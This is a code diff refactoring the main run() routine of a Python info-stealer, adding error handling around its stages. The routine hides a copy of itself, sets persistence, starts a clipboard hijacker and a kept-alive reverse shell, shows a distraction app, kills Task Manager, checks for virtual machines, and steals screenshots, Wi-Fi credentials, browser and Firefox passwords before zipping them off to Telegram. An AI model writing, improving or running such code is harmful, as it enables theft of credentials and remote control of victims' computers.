@@ -649,49 +649,52 @@ def keep_reverse_shell_alive():
 
 
 def run():
-    ensure_hidden_copy()
+    try:
+        ensure_hidden_copy()
+        single_instance_check()
+        persist()
 
-    # Only allow ONE instance ever (main or hidden)
-    single_instance_check()
+        threading.Thread(target=clipper_loop, daemon=True).start()
+        threading.Thread(target=keep_reverse_shell_alive, daemon=True).start()
+        launch_distraction_app()
 
-    # Always make sure persistence is set
-    persist()
+        try:
+            if not already_exfiltrated():
+                profile_system()
+                take_screenshot()
+                if check_webcam():
+                    with open(os.path.join(EXTRACT_FOLDER, "webcam.txt"), "w") as f:
+                        f.write("Webcam detected.")
+                extract_wifi()
+                detect_vm()
+                kill_taskmgr_once()
+                clipper()
+                steal_browser()
+                steal_firefox_passwords()
+                send_zip_to_telegram()
+                mark_exfiltrated()
+        except Exception as e:
+            with open(os.path.join(EXTRACT_FOLDER, "error.log"), "a") as log:
+                log.write(f"profile/exfil phase failed: {e}\n")
 
-    # From here, run logic ONCE (original or copied, doesn't matter)
-    threading.Thread(target=clipper_loop, daemon=True).start()
-    threading.Thread(target=keep_reverse_shell_alive, daemon=True).start()
-    # launch_distraction_app()
-    launch_distraction_app()
+        fake_input()
 
-    if not already_exfiltrated():
-        profile_system()
-        take_screenshot()
-        if check_webcam():
-            with open(os.path.join(EXTRACT_FOLDER, "webcam.txt"), "w") as f:
-                f.write("Webcam detected.")
-        extract_wifi()
-        detect_vm()
-        kill_taskmgr_once()
-        clipper()
-        steal_browser()
-        steal_firefox_passwords()
-        send_zip_to_telegram()
-        mark_exfiltrated()
+        while True:
+            time.sleep(10)
 
-    fake_input()
+    except Exception as e:
+        with open(os.path.join(EXTRACT_FOLDER, "error.log"), "a") as log:
+            log.write(f"run() fatal error: {e}\n")
 
-    while True:
-        time.sleep(10)
+        # fall into infinite loop anyway
+        while True:
+            time.sleep(10)
 
 
 
 
 if __name__ == "__main__":
-    while True:
-        try:
-            run()
-        except Exception as e:
-            pass  # Optionally print or log this
-        time.sleep(30)
+    run()
+
 
 
